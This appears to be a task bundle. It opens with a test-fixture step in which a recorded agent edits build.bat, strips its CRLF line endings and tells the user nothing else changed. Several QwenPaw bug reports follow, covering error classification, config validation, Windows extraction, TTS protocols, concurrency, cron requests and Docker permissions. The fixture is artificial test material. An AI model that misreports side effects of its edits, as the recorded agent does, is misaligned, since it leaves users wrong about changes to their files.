2. Prepare the fixture described here:

Prepare build.bat with CRLF endings and a set TARGET=staging line. Use ACP with the default Tool Guard, permission policy allow_once, and deepseek-chat. The recorded fixture had seven CRLF lines.

edit_file(build.bat, 'set TARGET=staging' -> 'set TARGET=production') returns 'Successfully replaced text in build.bat.'; the final build.bat has 0 CRLF (fixture had 7); the agent tells the user nothing else changed.

issues.title: [Bug]: OpenAI-compatible gateway bare APIError with real status only in message text (`status_code=502, ...`) is classified as `unknown` — no retry, no model fallback
issues.body:
## English summary

When an OpenAI-compatible gateway/relay fails mid-stream, the OpenAI SDK raises a **bare `openai.APIError`** (no `status_code`, no `response`) whose only status hint is plain text like:

```
status_code=502, 请联系管理员处理！ (request id: ...)
```

`extract_status_code()` only recognizes the narrow `"Streaming response failed: [5xx]"` message format, so this error is classified as `unknown` by `classify_model_error()` → **neither same-model retry nor cross-model fallback fires**, and the whole turn/cron job dies. A genuine HTTP 502 from the same gateway WOULD be `transient` and fallback-eligible, so identical upstream failures behave inconsistently depending only on how the gateway wraps them.

Observed in production today: 3 scheduled agent jobs (07:30 / 08:00 / 09:30) all failed with no fallback, no message delivered. Reproduced against `classify_model_error` with the exact logged exceptions (see below).

Suggestion: extend `error_utils.extract_status_code()` to also recognize `status_code=5xx`-style patterns in gateway messages (keep it narrow, e.g. `\bstatus_code\s*=\s*([1-5]\d{2})\b`), or treat bare `openai.APIError` with a `5xx` in the message as transient. Related but distinct from #8092 (that one is about content-inspection text being misclassified as `bad_request`; this one is about status extraction missing a gateway message format).

## 环境 / Environment

- QwenPaw 2.2.2.post1（Docker `agentscope/qwenpaw:latest`），Debian 13 宿主机
- 模型走 OpenAI 兼容中转网关（relay），主模型 `deepseek-v4.1-flash`，已配置 `fallback_models`（zhipu-cn / glm-5.3-flash），`fallback_policy.enabled=true`

## 现象 / What happened

2026-10-30 早上三个 cron 任务（07:30 备份上云、08:00 早报、09:30 巡检）准点触发（日志有 `cron execute`），但全部失败，备用模型一次都没被尝试，飞书一条消息都没发出：

```
07:30:30 ERROR runtime: unhandled error ...: Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}
08:00:12 ERROR runtime: unhandled error ...: Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}
09:30:40 ERROR runtime: unhandled error ...: APIError('status_code=502, 请联系管理员处理！ (request id: ...)')
```

## 复现 / Reproduction

用日志里的**原始异常形态**直接喂 `classify_model_error()`（QwenPaw 2.2.2.post1 自带实现）：

```python
import openai
from qwenpaw.providers.model_error_policy import classify_model_error

class FakeRequest: method='POST'; url='http://x/v1/chat/completions'; headers={}
class FakeResp:
    status_code = 400
    headers = {}
    request = FakeRequest()

# 形态 A：网关把上游故障包装成 HTTP 400 + type=upstream_error
e1 = openai.BadRequestError(
    message="Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}",
    response=FakeResp(), body=None)

# 形态 B：流中失败，SDK 抛裸 APIError，真实状态码只在消息文本里
e2 = openai.APIError(
    message='status_code=502, 请联系管理员处理！ (request id: ...)',
    request=FakeRequest(), body=None)

print(classify_model_error(e1))  # kind=bad_request  retryable=False fallback_eligible=False
print(classify_model_error(e2))  # kind=unknown      retryable=False fallback_eligible=False
```

实测输出：

```
08:00  400 upstream_error: 分类=bad_request  可重试=False  会切备用=False
09:30  裸APIError 502: 分类=unknown  可重试=False  会切备用=False
```

## 期望 / Expected

- **形态 B（本 issue 核心）**：`status_code=502` 明明白白写在消息里，应被 `extract_status_code()` 提取出来并归类为 `transient` → 可重试、可切换备用模型。
- **形态 A（顺带讨论）**：`type=upstream_error` + `bad_response_status_code` 表明是网关上游故障而非请求本身问题，但被包装成 HTTP 400 后按现有设计判为 `bad_request`（不 fallback）。这个可以理解设计初衷（400 通常意味着请求有问题），但网关把 5xx 包装成 400 是常见行为，`upstream_error` 这个 type 是否值得加入 transient 判定，请作者权衡。

## 源码位置 / Source

- `qwenpaw/providers/model_error_policy.py`：`fallback_eligible = retryable or kind == "model_not_found"`，`unknown`/`bad_request` 均不在内
- `qwenpaw/providers/error_utils.py`：`_STREAMING_ERROR_STATUS_RE` 只匹配 `Streaming response failed: [5xx]` 这一种文本格式，注释里也写明"keep this fallback deliberately narrow"

同类参考：#8092（阿里网关审核文本被误分类为 bad_request，同属"网关非标准错误形态导致分类失真"家族）、#8124（已修：审核错误路由到 fallback）。

谢谢！

issues.title: [Bug]: Model config write path bypasses field validation — invalid thinking_budget / max_input_length are persisted and the provider silently disappears after restart
issues.body:
## Summary

`ModelInfo` declares `thinking_budget >= 1` and `max_input_length >= 1000`, but the per-model config write path never enforces those bounds, so an out-of-range value is accepted, persisted to disk, and then breaks every read path — after a restart the provider fails to load and silently disappears.

## The chain

1. `Provider.update_model_config` (`src/qwenpaw/providers/provider.py`) handles `thinking_budget` and `max_input_length` with a bare `int(...)` assignment. Pydantic does not validate plain attribute assignment (`validate_assignment` is not enabled), so the declared `ge` bounds in `src/qwenpaw/providers/model_info.py` are never checked on this path.
2. The HTTP layer has the same gap: `ModelConfigRequest.thinking_budget` (`src/qwenpaw/app/routers/providers.py`) is the only numeric field in that model without a bound — `max_input_length` carries `ge=1000` and `generate_kwargs.max_tokens` has an explicit `>= 1` validator.
3. The invalid value is stored and persisted by `ProviderManager.update_model_config`.
4. Read paths re-validate: `resolve_model_info` runs `ModelInfo.model_validate(model.model_dump())` and raises `ValidationError`. After a restart, `load_provider` catches the validation failure and returns `None` — a custom provider silently disappears, and a built-in provider loses all persisted configuration, with no error pointing at the value that caused it.

## Reproduction (against current main)

```python
provider.update_model_config("m1", {"thinking_budget": 1024})  # baseline OK
provider.update_model_config("m1", {"thinking_budget": -5})
# -> returns True, stores -5 (declared ge=1)
provider.resolve_model_info("m1")
# -> ValidationError: thinking_budget Input should be greater than or equal to 1
OpenAIProvider.model_validate(provider.model_dump())
# -> ValidationError (1 error) -> load_provider returns None after restart
```

## Related: `thinking_budget_range` has no shape validation

`ModelInfo(thinking_budget_range=[8000])` constructs fine, but `Provider.thinking_control()` unpacks `low, high = info.thinking_budget_range` and raises `ValueError: not enough values to unpack`. The newer `ThinkingControl` model (`src/qwenpaw/providers/thinking.py`) already validates that a budget range is complete and ordered; the legacy `List[int]` field has no equivalent check. A malformed range also poisons `list_provider_info`, which aggregates providers without isolating per-provider failures.

## Expected behavior

- Out-of-range `thinking_budget` / `max_input_length` values are rejected at write time (HTTP request validation and `update_model_config`), consistent with how `update_model_config` already rejects an invalid `model_type` or non-boolean `supports_*` values with `ValueError`, instead of being persisted.
- `thinking_budget_range` only accepts a complete, ordered `[min, max]` pair.

I have a fix and regression tests ready and would like to work on this.

issues.title: Creator: the only bundled inspiration example (cat-perspective-0803) still cannot be opened on Windows in 2.0.4 — regression of #7291, which was closed as fixed in 1.1.2
issues.body:
## Environment

| | |
|---|---|
| QwenPaw core | **2.2.2.post1** (latest stable, published 2026-10-22) |
| qwenpaw-creator | **2.0.4** |
| Python | 3.12.13 |
| OS | Windows Server 2022 (10.0.20348), x86_64 |
| Locale / TZ | zh-CN / Asia/Shanghai |

## Summary

`POST /api/qwenpaw-creator/examples/cat-perspective-0803/open` fails with
`503 STORAGE_INTEGRITY_ERROR`. The archive downloads fine and its checksum
verifies; the failure is in extraction, because one directory inside the
archive contains a `:` and Windows cannot represent it.

`backend/examples/manifest.json` ships **exactly one** example, so on Windows
the entire "inspiration examples" feature is dead — there is no example a
Windows user can open.

This is the same failure reported in #7291, which was closed as `completed`
on 2026-08-31 with the note:

> Both issues (the `os.fsync` failure during archive download and the
> extraction failure caused by Windows-illegal characters like `:` in archive
> paths) are **fixed in qwenpaw-creator 1.1.2**. Please upgrade the plugin and
> try again — feel free to reopen if anything still fails.

2.0.4 is much later than 1.1.2, and it still fails. So this looks like a
regression, or the fix never landed in the released line.

## Reproduction

1. Install QwenPaw 2.2.2.post1 + qwenpaw-creator 2.0.4 on Windows.
2. Open Creator → home → inspiration examples → click "小猫视角"
   (`cat-perspective-0803`).
3. The download succeeds, then the request fails with 503.

Reproduced twice in a row (17:13 and 17:14 local), identical failure.

## Observed

Surfaced to the UI:

```
status=503 code=STORAGE_INTEGRITY_ERROR
method=POST path=/api/qwenpaw-creator/examples/cat-perspective-0803/open
error_id=error-999601b341b9492e925238c0ff9c2483
StorageIntegrityError: 灵感示例归档无法解包: cat-perspective-0803
```

The underlying exception, which is only visible in `creator.log`:

```
File ".../backend/api/example_routes.py", line 322, in _materialize_example
    _extract_example_archive(archive_path, extract_dir)
File ".../backend/services/project_files/archive.py", line 133, in extract_archive
    raise BadRequestError(
BadRequestError: archive path is not supported on Windows:
  'project-10ee251e37e45f64aaf560b1f5b5b09f/assets/source-intelligence/source:cat_cam_1/';
  import on Linux or macOS to preserve its media references
```

Download and integrity are **not** the problem:

```
17:13:32  Downloading remote file | url=https://creator-store.oss-ap-southeast-1.aliyuncs.com/example/cat-perspective-0803.zip max_bytes=2147483648 timeout=300s
17:13:49  Downloaded remote file | path=<data_root>/.example-staging/<uuid>/archive.zip, size_mib=106.2
17:13:50  Creator request failed ... status=503 code=STORAGE_INTEGRITY_ERROR
```

106.2 MiB in 17 s, and the sha256 check passed (a checksum mismatch would have
raised "校验失败" instead).

## Root cause, verified against the actual archive

I downloaded the archive independently and inspected it without extracting:

- `https://creator-store.oss-ap-southeast-1.aliyuncs.com/example/cat-perspective-0803.zip`
- compressed `111,352,101` B, sha256 `e91955b3b44ae4e78c117519e8e83887f7e6fab41df00976a786ed17b1f64c7b`
  — **matches** the manifest
- 465 members, 122.6 MiB uncompressed, 83 directories
- members with Windows-illegal characters: **2**
- members hitting reserved names (`CON`/`NUL`/`COM1`…): **0**
- members with trailing space/dot: **0**
- members with a path longer than 240 chars: **0**
- the only illegal character present: **`:`**

The two offending members:

```
DIR   project-10ee251e37e45f64aaf560b1f5b5b09f/assets/source-intelligence/source:cat_cam_1/
FILE  project-10ee251e37e45f64aaf560b1f5b5b09f/assets/source-intelligence/source:cat_cam_1/source-intelligence-5ee4da7fd8e35741bd8fc87189e3b170.json
```

That file is 32,817 B. So a 122.6 MiB / 465-member project is rejected in its
entirety because of one 32 KB sidecar.

`extract_archive` raises on the **first** unrepresentable member and aborts the
whole extraction, discarding everything already unpacked (`.example-staging` is
left empty).

### What the sidecar is

It is a source-intelligence index for a 21 m 48 s cat-POV clip: `8` shots,
`15` semanticEntries, `8` entities, a summary, `2` modelRuns,
`id = source-intelligence-5ee4da7fd8e35741bd8fc87189e3b170`.

Per the docstring on `SourceMemoryRef` in `schemas/assets.py`, this class of
artifact is *"Hydrated at read time from `runtime/source-intelligence/<index-id>/memory`;
never persisted inside the immutable index JSON"* — i.e. a derived cache, not
authoritative project data.

### How `project.json` references it

`source:cat_cam_1` occurs 4 times in `project.json` (86,832 B):

1. as a **dict key** under `sources.sources.items`
2. as the value of `"source_id"`
3. inside `"order": ["source:cat_cam_1"]`
4. as a **path**: `"relative_uri": "assets/source-intelligence/source:cat_cam_1/source-intelligence-5ee4da7fd8e35741bd8fc87189e3b170.json"` (with its own `sha256` and `file_id`)

Only **#4 is a filesystem path.** #1–#3 are logical identifiers that live
inside JSON and are legal on every platform.

Two facts that make a rename-based fix straightforward:

- The on-disk path is resolved **from the registry**, not derived from
  `source_id`:
  - `services/media/source_observation.py:401` → `Path(project_root, indexed.relative_uri)`
  - `services/file_agent_runtime/driver.py:9384` → `(project_root / indexed.relative_uri).read_text(...)`
  - `services/project_files/assets.py:412` → `project_root / PurePosixPath(indexed.relative_uri)`
- `_validate_relative_uri` (`services/project_files/models.py:170`) rejects only
  empty/untrimmed values, `\`, NUL, absolute paths, `<2` parts, a first part
  other than `assets`, and traversal segments. It accepts a sanitized name
  just as readily as the colon form — which is also why `project.json` itself
  loads fine on Windows and only *extraction* fails.

The registry `sha256` covers file **content**, so renaming the containing
directory does not invalidate it.

## The promised sanitizing logic is absent from 2.0.4

`services/project_files/archive.py` has exactly two `sys.platform == "win32"`
branches:

- line 127 — the hard `raise BadRequestError(...)` shown above
- line 149 — the `\\?\` long-path prefix

Grepping the whole backend for `sanitize`, `sanitize_windows`, `windows_safe`,
`def _sanitize`, `rewrite` returns **no hits**. There is no code path that
maps an unrepresentable member name to a legal one, and nothing that rewrites
`relative_uri` to match.

## Suggested fix

Essentially what #7291 said would ship:

1. When materializing an archive on Windows, map illegal characters in member
   names to legal ones (`:` is the one that actually occurs here) instead of
   aborting.
2. Rewrite the affected `relative_uri` entries in `project.json` so the
   registry keeps pointing at the real on-disk path.
3. Leave logical identifiers alone — `source_id`, the `sources.items` dict key
   and the `order` array are JSON-internal and need no change.
4. Apply the same handling to **user-imported** archives, not just bundled
   examples.

Two additional points worth considering:

- **Don't fail the whole import over one unrepresentable member.** Here the
  member is a 32 KB derived cache that is documented as hydrated-at-read-time.
  Skipping it with a warning would yield a fully usable project; aborting
  throws away 122.6 MiB of good data. A per-member skip-with-warning (or at
  least an explicit "N members could not be represented on Windows" summary)
  would degrade far more gracefully than a 503.
- **The error message loses the only actionable hint.** `example_routes.py:324`
  re-raises the `BadRequestError` as
  `StorageIntegrityError("灵感示例归档无法解包: cat-perspective-0803")`, so the
  user sees a bare 503 while the useful text ("archive path is not supported
  on Windows … import on Linux or macOS") stays in the log. Chaining the
  original reason into the user-facing message would make this self-diagnosing.

## Possibly wider impact (inference — not yet verified)

`source_id` values are generated by the app with a literal colon prefix
(`services/file_agent_runtime/driver.py:3197`:
`source_id = f"source:{uuid4().hex}"`, and the query expression
`("source:" + $logicalId) as $sourceKey` at `driver.py:10053` /
`services/project_files/agent_tools.py:562`).

If a project created on macOS/Linux materializes a source-intelligence
directory named after that id, then **any** such archive exported there and
imported on Windows would hit the same wall — not just the bundled example.
I have not verified this path end to end; flagging it because it would make
the fix worth prioritizing beyond the demo project.

## Minor: the #7184 cross-reference in #7291 does not resolve

The comment on #7291 says *"This is the same approach described in #7184 for
import archives"*, but #7184 is
"[Feature]: Add an Agent-level cross-session recall toggle for Scroll", which
is unrelated. Possibly a wrong issue number; mentioning it so the intended
prior art can be found.

## Workaround used while waiting

None needed for me — I do not require this example. Documenting the manual
route for anyone who does: fetch the archive, verify its sha256, extract the
463 representable members, rename `source:cat_cam_1` to a legal name, and
update the single `relative_uri` occurrence in `project.json` accordingly.
`source_id`, the dict key and `order` stay untouched.

issues.title: Creator: TTS cannot use an Aliyun Token Plan key — the qwen-audio-tts family speaks a different DashScope service, and the protocol option is missing from the model-config UI
issues.body:
## Environment

- QwenPaw **2.2.2.post1**, Windows Server 2022
- Plugin **QwenPaw Creator 2.0.4** (installed from Apps)
- Credential: Aliyun **Token Plan (team edition)** API key, `sk-sp-` prefix
- All measurements below were taken live on **2026-11-02** against
  `token-plan.cn-beijing.maas.aliyuncs.com`.

## Summary

In Creator's model configuration, **LLM / VLM / image / video already offer
`Aliyun Token Plan` as a protocol**, and switching them over works. **TTS and
digital-human (s2v) still offer only `DashScope（百炼）`.**

For TTS this is not just a missing dropdown entry — even hand-editing
`model_config.json` to point `tts.base_url` at the Token Plan gateway cannot
work, because the model a Token Plan subscription serves
(`qwen-audio-3.0-tts-plus`) is on a **different DashScope service** than the
one Creator implements.

## Root cause

### 1. Two different DashScope synthesis services

`backend/models/tts_model.py` posts synthesis requests to a hard-coded path:

```
services/aigc/multimodal-generation/generation      # qwen-tts family
```

`qwen-audio-3.0-tts-plus` / `-flash` instead live on:

```
services/audio/tts/SpeechSynthesizer                # qwen-audio-tts family
```

and they nest **every** synthesis parameter inside `input` (there is no sibling
`parameters` object):

```json
{
  "model": "qwen-audio-3.0-tts-plus",
  "input": {
    "text": "...", "voice": "...", "format": "mp3",
    "sample_rate": 24000, "rate": 1.3, "volume": 50, "pitch": 1.0
  }
}
```

The response shape, however, **is** the same `{output:{audio:{url}}, usage:{characters}}`,
so `_download_audio()` and the usage accounting can be reused unchanged.

Two further family differences worth encoding in `tts_capabilities.py`:

- `qwen-audio-tts` accepts a numeric `rate` (0.5–2.0) **over HTTP**. The current
  gate `if rate != 1.0 and transport != "websocket"` therefore rejects a rate
  this model actually supports.
- Its system-voice catalogue is **597 voices per model**, named with a
  model-name prefix (`qwen-audio-3.0-tts-plus-longcanzhuyue`). That is far too
  large to inline in the capability table, so it wants a data file.

### 2. The UI protocol list has no Token Plan entry

In the built bundle the per-capability protocol option arrays are:

```js
Do = [..., "Aliyun Token Plan"]   // image  ✓
Po = [..., "Aliyun Token Plan"]   // video  ✓
Io = ["DashScope（百炼）"]         // tts    ✗
Ao = ["DashScope（百炼）"]         // s2v    ✗
```

plus a load-time normalisation that silently rewrites anything unlisted:

```js
Io.includes(q.tts.protocol) || (q.tts.protocol = Io[0])
```

So a hand-edited `tts.protocol = "Aliyun Token Plan"` is **reset back to
DashScope** the moment the model-config panel is opened and saved. The
per-protocol defaults table (`tts` → `{"DashScope（百炼）": {base_url, models}}`)
also has no Token Plan row.

Interestingly the i18n bundle **already ships** a `ttsTokenPlanHint` string
("Token Plan supports CosyVoice synthesis models; voice cloning and voice
design need a general DashScope API key"), so this looks half-finished rather
than deliberately excluded.

### 3. The connectivity probe hard-codes the same wrong path

`_probe_payload()` in `backend/api/model_routes.py` rebuilds the TTS probe URL
from `urlparse(base_url).netloc` plus a literal
`/api/v1/services/aigc/multimodal-generation/generation`, so the "test
connection" button would validate the wrong service for this family.

## Measured evidence

`GET https://token-plan.cn-beijing.maas.aliyuncs.com/compatible-mode/v1/models`
with a Token Plan key returns **21 models**. Speech-relevant ones:

```
qwen-audio-3.0-tts-plus        <- the only speech-synthesis model in the plan
qwen-audio-3.0-asr-flash
qwen-audio-3.0-realtime-plus
```

`contains 'cosyvoice': []` — no CosyVoice model is in the plan, so the
WebSocket transport in `tts_model.py` is unreachable on Token Plan regardless
(the `dashscope` SDK is pinned to `wss://dashscope.aliyuncs.com/api-ws/v1/inference`).

`POST /api/v1/services/audio/tts/SpeechSynthesizer` with
`model=qwen-audio-3.0-tts-plus`, `voice=longanhuan_v3.6`, `text="嗨"`:

```
HTTP 200   content-type: application/json
{"output":{"audio":{"data","expires_at","id","url"},"finish_reason":"stop"},
 "usage":{"characters":2},"request_id":"c38d8ff4-ceb4-4b31-92ff-ce19b1123a5c"}
```

A full 30-character sentence returned a 4.54 s / 24 kHz mono / 160 kbps mp3
(90,811 bytes) and billed `characters: 47`; the same text at `rate=1.3`
returned 1.54 s and billed 17. So **`rate` works over HTTP** for this family.

Voice management is absent on Token Plan —
`POST /api/v1/services/audio/tts/customization` returns
`404 {"code":"InvalidParameter","message":"Model not exist."}` for all three of
`qwen-voice-enrollment`, `voice-enrollment` and `qwen-voice-design`. Voice
cloning/design therefore genuinely needs a second, general DashScope key.

System voices were verified by live probe rather than scraped, because the
naming is inconsistent: `longanhuan_v3.6`, `longanlingxin`, `longanlufeng` and
`longanlingxi` all return HTTP 200, while 13 other plausible names
(`longanfengyue`, `loongmary`, `longanhuan_v3.1`, `Cherry`, ...) return
`400 [cosyvoice:]Engine error [411]: TTS speak operation failed`.

## Suggested change

Backend (+200/−35 across three files, plus one generated data file):

1. `models/tts_capabilities.py` — add a third family `qwen-audio-tts` with a
   per-capability `http_suffix`, a `supports_rate` flag (replacing the
   `transport != "websocket"` test) and a `supports_clone` flag; load the 597
   voice ids from `models/tts_voices/<model>.json` (regenerated from the
   official 基础音色 workbook) instead of inlining them.
2. `models/tts_model.py` — branch the payload on family: `qwen-audio-tts` posts
   to `capability.http_suffix` with `format` / `sample_rate` / `rate` inside
   `input`; refuse clone/design with an actionable message when
   `supports_clone` is false, instead of letting a 404 surface mid-project.
3. `api/model_routes.py` — build the TTS probe URL from
   `capability.http_suffix` rather than a literal, and fall back to the
   existing zero-cost `_token_plan_models_probe()` when the model has no system
   voices and no management surface.

Frontend (`ui/src`, two spots): add `"Aliyun Token Plan"` to the TTS protocol
array and a `{base_url: "https://token-plan.cn-beijing.maas.aliyuncs.com/api/v1", models: []}`
row to the TTS defaults table. (`models: []` because the TTS model dropdown is
already served by `GET /models/tts-capabilities`.)

## Not fixable in code: digital human on Token Plan

Reporting this so nobody else spends time on it. `s2v` cannot run on a Token
Plan subscription, for two independent reasons:

1. **The model is not in the plan.** The 21-model list contains no s2v /
   lip-sync model at all — neither `wan2.2-s2v` nor `wan2.2-s2v-detect`. Only
   `wan3.0-video` (plain video generation).
2. **There is no media-upload channel.** `wan2.2-s2v` only accepts
   `image_url` / `audio_url`, so local media must first go through the
   model-bound temporary storage API. On the Token Plan gateway
   `GET /api/v1/uploads?action=getPolicy` answers **404 with an empty body**
   for both `wan2.2-s2v` and `wan3.0-video`. This matches the note already in
   `models/config.py::is_token_plan_protocol()`. `video_model.py` works around
   it by passing public HTTP(S) URLs through untouched, but a digital-human
   portrait and its driving audio are normally local artefacts.

The workable configuration today is to leave `s2v` on a general DashScope key
(`reuse_llm_key: false`) while everything else runs on Token Plan — which the
schema already supports, so this part only needs documenting.

## Minor doc bug (Aliyun side, FYI)

The Token Plan "接入多模态生成模型" page shows the TTS call as
`curl ... -o "speech.mp3"`, implying a binary response. The endpoint actually
returns `application/json` with `output.audio.url`; the Qwen-Audio-TTS HTTP API
reference is the correct one.

## Happy to help

I have this working locally (offline request-construction tests plus a live
end-to-end synthesis through `tts_model.synthesize()`). I don't have push
access to open a PR, but I can supply the full diff and the voice-catalogue
generator on request.

issues.title: Feishu channel: intermittent `ProviderError: No active model configured` when a new message arrives while the agent is still processing the previous one
issues.body:
### Environment
- QwenPaw Desktop: v2.3.0-beta.1 (also reproduced on v2.2.2 - NOT introduced by the beta)
- OS: Windows 11 Pro 64-bit
- Channel: Feishu (channel message -> feishu:sw:<session>)

### Symptoms
- Intermittent "Internal error" shown in the Feishu chat when the user sends a new message while the agent is still processing the previous one in the SAME session.
- Retrying the same message succeeds immediately - no data loss, but frequent enough to be disruptive.
- Backend log (both versions):

```
ERROR | qwenpaw/runtime/runtime.py:193 | runtime: unhandled error session=...: No active model configured
qwenpaw.exceptions.ProviderError: No active model configured
ERROR | qwenpaw/app/channels/base.py:1038 | channel _stream_with_tracker failed: No active model configured, session=feishu:sw:..., agent=...
```

### Evidence that it is a concurrency race, not a config loss
- `active_model` is present the whole time (agent.json `active_model=kexin_token/glm-5.3-flash`; provider registry intact, 41 providers, all enabled).
- Timeline strictly correlates with concurrent sends: e.g. 18:24:33 fail -> 18:25:34 success; 18:25:49/18:25:53/18:26:02/18:26:15 four consecutive fails -> 18:26:21 success. Every failed attempt coincides with the previous message still being processed.
- Occurrence counts: 4 errors on 10-29 23:57 (still on v2.2.2, before upgrade), 28 errors 18:24-18:27, 1 error 19:19:11 (on v2.3.0-beta.1).
- Network/model API verified healthy at failure time (model API reachable in 0.04-0.12s) - rules out connectivity.

### Root cause (speculation)
When a new message arrives while the session's previous run is still active, the message handler builds the request before the model/session state is (re)bound, so it fails with "No active model configured" instead of being queued.

### Expected behavior
- Same-session concurrent messages should be queued (serialized) rather than rejected, or
- Fail with a clear, retryable "session busy" error instead of `ProviderError: No active model configured`.

### Suggested fix direction
Queue incoming channel messages per session while busy (or acquire the session lock before reading active model config).

issues.title: [Bug]: Codex/Qoder 后端的定时任务将非空请求误判为空
issues.body:
### 现象

智能体使用 `codex`（或其他第三方后端）时，包含完整文本指令的 `agent` 类型定时任务会立即失败：

```text
ValueError: Third-party agent requests require text or attachments
```

失败发生在交给第三方智能体之前。

### 复现步骤

1. 为智能体选择 Codex 后端。
2. 创建一条包含非空文本指令的 `agent` 类型定时任务。
3. 手动执行或等待调度触发。
4. 观察执行记录中的上述异常。

已在当前 `main`（`c26d31c0688aa9cce9bc1aef688177d2e14e25df`）通过单元测试复现；原问题也出现在 `2.2.2`。

### 原因和预期行为

`CronExecutor.execute()` 将 `job.request.model_dump(mode="json")` 得到的字典传入 `Workspace.stream_query()`。内置 `Runtime` 会将字典转换为 `AgentRequest`，但第三方后端直接进入 `HarnessRuntime`，其中通过 `getattr(request, "input", None)` 读取输入，因此把非空字典请求误判为空。

预期在共享请求入口统一转换字典，再选择后端；已有请求对象保持原样。文本、附件、`session_id`、`user_id`、`channel` 和 `request_context` 都应保留。

### 修复验证

准备的最小修复仅在 `Workspace.stream_query()` 中增加字典到 `AgentRequest` 的转换，并增加 Codex/Qoder、字典/已有对象、附件和执行上下文的回归测试。

```text
修复前：3 failed, 4 passed
修复后（Harness 和 cron 相关单元测试）：249 passed, 3 skipped
```

将提交对应的修复 PR。

issues.title: [Bug]: Hub Docker runtime fails to start with Permission denied on working/config.json when Hub runs as non-root
issues.body:
## QwenPaw Version

The deployed package version and Docker image tag/digest were not captured in the available report.

Source analysis below was checked against upstream commit [c26d31c0688aa9cce9bc1aef688177d2e14e25df](https://github.com/agentscope-ai/QwenPaw/commit/c26d31c0688aa9cce9bc1aef688177d2e14e25df). This is the reviewed source revision, not a claim that the affected server runs that exact revision.

## Description

A QwenPaw Hub running as a regular Ubuntu user starts successfully, but starting an existing personal Docker runtime fails with:

```text
[Errno 13] Permission denied: '/data/qwenpaw/hub/runtimes/<runtime-id>/working/config.json'
```

The observed failure is a host-side access failure on a runtime's shared configuration. Source review suggests an ownership mismatch between the non-root Hub and the root application in the Docker image. Actual file ownership/mode and Docker user-namespace settings on the affected server have not yet been collected, so this cause still needs runtime verification.

**Security considerations:** A fix should preserve restrictive configuration/secret permissions and avoid requiring the Hub itself to run as root.

## Component(s) Affected

- [x] Core / Backend (Hub runtime lifecycle, configuration persistence)
- [x] Scripts / Deploy (Docker entrypoint and Supervisor)

## Environment

- **OS:** Ubuntu server; release not captured
- **Hub process user:** Non-root user `ubuntu`
- **Python:** 3.12, according to the installed-package log path
- **Install method:** Hub runs from a Python environment on the host; managed runtime uses the Docker backend
- **Docker image tag/digest, Engine version, rootless/userns mode:** Not captured

## Steps to Reproduce

Observed trigger:

1. Run the Hub as the regular `ubuntu` user with an existing personal Docker runtime.
2. Start the Hub with:

   ```bash
   qwenpaw hub \
     --host 0.0.0.0 \
     --port 8080 \
     --force-public \
     --config hub.yaml
   ```

3. A runtime start operation fails while accessing that runtime's `working/config.json`.

Suggested focused reproduction to verify the suspected cause (not yet independently executed):

1. Use a non-root Hub with a standard Linux Docker Engine and the current runtime image.
2. Initialize a Docker runtime, then cause the container application to save configuration in the bind-mounted working directory.
3. Record ownership and mode of `config.json` and `workspaces/*/agent.json`, then stop/start the runtime.
4. Check whether host-side configuration preparation fails after the container has written root-owned, owner-only files.

## Actual vs Expected

- **Actual:** The Hub HTTP server starts, but the personal runtime start operation fails with `EACCES` on its shared configuration.
- **Expected:** Runtime initialization and later configuration writes remain accessible to the Hub across runtime and Hub restarts, while keeping sensitive files private.

## Logs / Screenshots

Relevant output from the affected Ubuntu host; the runtime ID has been redacted:

```text
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
WARNING lib/python3.12/site-packages/qwenpaw/hub/service.py:531 | 2026-10-30 20:37:56 | Runtime <runtime-id> start operation failed: [Errno 13] Permission denied: '/data/qwenpaw/hub/runtimes/<runtime-id>/working/config.json'
```

## Additional Notes

### Source evidence and suspected failure mechanism

All links below refer to the same upstream revision, `c26d31c0688aa9cce9bc1aef688177d2e14e25df`:

- [DockerRuntimeProvisioner.start](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/src/qwenpaw/hub/docker_provisioner.py#L219-L245) creates read/write bind mounts for working, secrets, and backups without specifying a container user.
- [entrypoint.sh](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/deploy/entrypoint.sh) runs `qwenpaw init` before starting Supervisor, without dropping privileges.
- [Supervisor configuration](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/deploy/config/supervisord.conf.template) sets `[supervisord] user=root`; the application has no separate `user=`.
- [RuntimeService._start_locked](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/src/qwenpaw/hub/service.py#L266-L270) calls `prepare_workspace_paths` before `provisioner.start`.
- [prepare_workspace_paths](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/src/qwenpaw/hub/runtime_paths.py#L58-L68) reads `config.json` and workspace `agent.json` files on the host.
- [write_text_atomic](https://github.com/agentscope-ai/QwenPaw/blob/c26d31c0688aa9cce9bc1aef688177d2e14e25df/src/qwenpaw/utils/io_utils.py#L280-L320) defaults new internal files to `0600` and uses a sibling temporary file plus `os.replace`. Existing permission bits are preserved, but ownership is not explicitly preserved. A root writer can therefore replace a Hub-owned configuration with a root-owned inode.

### Possible fix direction

Align the host-visible identity used for runtime initialization and subsequent application writes with the Hub's shared-data access requirements.

Simply adding a hard-coded `user="1000:1000"` to the provisioner is insufficient for the current image: Supervisor configuration generation, logs/PID/socket paths, system D-Bus, and desktop processes also need appropriate handling. A smaller approach could retain a privileged bootstrap/Supervisor while dropping initialization and application processes to the intended identity, with explicit HOME/environment setup.

Rootless Docker, userns-remap, and Docker Desktop require platform-aware identity handling rather than blindly copying the host UID/GID.

Existing root-owned data also needs a controlled one-time ownership migration while the affected runtime is stopped. Changing the image alone will not repair a file the Hub cannot read before container startup.

### Workaround and validation status

A targeted ownership repair on the affected instance has been suggested, but success has not yet been confirmed. No deployed code fix or independent reproduction is claimed here.

Useful regression coverage would include first initialization, subsequent application configuration writes, runtime stop/start, Hub restart, and continued Hub access to configuration without weakening file permissions.

### Duplicate search

